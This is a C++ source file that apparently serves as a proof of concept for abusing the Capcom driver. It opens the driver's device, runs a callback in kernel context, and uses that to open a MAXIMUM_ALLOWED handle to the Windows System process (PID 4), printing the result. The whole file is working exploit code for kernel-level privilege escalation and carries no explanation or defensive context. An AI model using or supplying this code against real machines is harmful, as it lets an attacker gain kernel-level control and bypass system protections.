#define RELEASE
#include <iostream>

#include "capcom.hpp"
#include "process.hpp"

int main()
{

	const capcom::driver_handle capcom(CreateFile(capcom::device_name, FILE_ALL_ACCESS, FILE_SHARE_READ, nullptr, FILE_OPEN, FILE_ATTRIBUTE_NORMAL, nullptr), CloseHandle);

	if(capcom.get() == INVALID_HANDLE_VALUE)
	{
		printf("CreateFileA failed! Error: %u\n", GetLastError());
		return 0; 
	}

	auto system_handle = INVALID_HANDLE_VALUE;
	const auto result = capcom::capcom_run(capcom, [&system_handle](auto mm_get_routine) {
		kernel::process::open_process(mm_get_routine, HANDLE(4), MAXIMUM_ALLOWED, &system_handle);
	});

	if(result == 0) {
		printf("success!\n");
		printf("acquired handle: 0x%p\n", system_handle);
		printf("pid of handle: %d\n", GetProcessId(system_handle));
	} else {
		printf("failure! %d\n", result);
	}

	std::cin.get();
	return 0;
}
